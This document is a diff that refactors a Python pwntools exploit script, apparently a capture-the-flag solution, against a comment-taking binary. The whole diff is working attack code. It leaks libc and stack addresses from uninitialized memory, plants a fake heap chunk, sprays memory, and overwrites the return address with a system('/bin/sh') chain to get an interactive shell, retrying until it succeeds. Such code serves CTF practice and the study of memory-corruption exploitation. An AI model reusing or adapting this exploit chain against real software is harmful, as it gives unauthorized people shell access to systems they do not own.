@@ -54,65 +54,69 @@ def spray():
         io.sendafter(b'movie? ', b"A")
         redo()
 
-def solve():
-
-    """
-    Get leaks from uninitialized memory
-    """
-
-    send_comment(b"A"*8, b"-", b"B"*(4 * 14), b"a")
+def get_leaks():
+    send_comment(b"A" * 8, b"-", b"B" * (4 * 14), b"a")
     io.recvuntil(b"Age: ")
-    leak1 = int(io.recvline())
-    io.recvuntil(b"B"*(4 * 14))
-    stack = u32(io.recv(4)) - 0x5a
 
-    stdout = ctypes.c_uint32(leak1).value 
-    libc.address = stdout - libc.sym['_IO_2_1_stdout_']
+    leak1 = int(io.recvline())
+    io.recvuntil(b"B" * (4 * 14))
+    stack = u32(io.recv(4)) - 0x5a
+    stdout = ctypes.c_uint32(leak1).value
+    libc.address = stdout - 0x1b0d60
+
     log.info(f"Libc base: {hex(libc.address)}")
     log.info(f"Stack: {hex(stack)}")
-    
-    redo()
+    return stack
 
-    """
-    Setup future fake chunk in the reason buffer
-    """
 
-    send_comment(b"A", b"-1", b"B"*4 + p32(0x41) + b"\x00" * (4 * 15) + p32(0x41), b"a")
+def setup_fake_chunk():
+    send_comment(
+        b"A",
+        b"-1",
+        b"B" * 4 + p32(0x41) + b"\x00" * (4 * 15) + p32(0x41),
+        b"a",
+    )
     redo()
 
     for _ in range(8):
         send_comment(b"A", b"-1", b"B", b"a")
         redo()
 
+
+def run_once():
+    stack = get_leaks()
+    redo()
+
+    setup_fake_chunk()
     spray()
     write_payload(stack)
 
-    try:
-        """
-        Overwrite return address with ropchain
-        """
+    offset = 76
+    payload = flat({
+        offset: [
+            libc.sym["system"],
+            0x0,
+            next(libc.search(b"/bin/sh\x00")),
+        ]
+    })
 
-        offset = 76
-        payload = flat({
-            offset: [
-                libc.sym["system"],
-                0x0,
-                next(libc.search(b"/bin/sh\x00"))
-            ]
-        })
-        send_comment(payload, b"1337", b"B", b"a")
-        do_not_redo()
+    send_comment(payload, b"1337", b"B", b"a")
+    do_not_redo()
 
-        io.interactive()
-    except Exception as e:
-        log.error(f"Exploit failed: Retrying...")
-        io.close()
 
 def main():
-    
     while True:
-        init()
-        solve()
+        try:
+            init()
+            run_once()
+            io.interactive()
+            break
+        except EOFError:
+            log.warning("Process died, retrying...")
+            io.close()
+        except Exception as e:
+            log.error(f"Unexpected failure: {e}")
+            io.close()
     
 
 if __name__ == '__main__':
